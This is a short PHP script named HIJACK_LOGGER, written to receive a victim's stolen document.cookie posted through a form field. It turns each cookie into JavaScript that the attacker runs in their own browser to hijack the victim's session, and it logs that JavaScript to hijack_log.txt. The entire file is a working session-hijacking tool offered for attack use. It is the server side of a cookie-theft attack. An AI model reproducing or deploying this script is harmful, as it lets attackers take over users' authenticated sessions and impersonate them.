<?php

/*
HIJACK_LOGGER (PHP version)

Expects a form field named 'c' that is just document.cookie from the session to be hijacked.
Generates some javascript code that can be run on the attacker's browser to hijack the session.
The generated Javascript is stored in hijack_log.txt file in the same directory as this script.
*/


$cookies = explode(';', $_POST['c']);
$script = '';

foreach($cookies as $cookie) {
  $cookie = trim($cookie);
  $script .= "document.cookie = '$cookie; expires=Wed, 1 Jan 2020 00:00:00 UTC; path=/';\n";
}

file_put_contents('hijack_log.txt', $script);



